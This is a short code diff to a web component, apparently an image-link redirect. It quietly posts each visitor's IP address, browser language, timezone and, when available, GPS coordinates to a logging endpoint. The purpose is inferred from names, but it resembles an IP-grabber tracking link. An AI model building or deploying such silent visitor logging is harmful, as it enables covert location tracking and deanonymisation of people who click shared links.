@@ -23,13 +23,18 @@ export function ImageRedirectClient({ imageUrl }: ImageRedirectClientProps) {
       }
 
       const sendLog = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
-        const body = { 
+        const body: any = { 
             ip: clientIp, 
             from: 'image',
-            lat: pos?.coords.latitude,
-            lon: pos?.coords.longitude,
-            acc: pos?.coords.accuracy,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         };
+        
+        if (pos) {
+            body.lat = pos.coords.latitude;
+            body.lon = pos.coords.longitude;
+            body.acc = pos.coords.accuracy;
+        }
 
         // Fire-and-forget request to log the data.
         fetch('/api/log-location', {
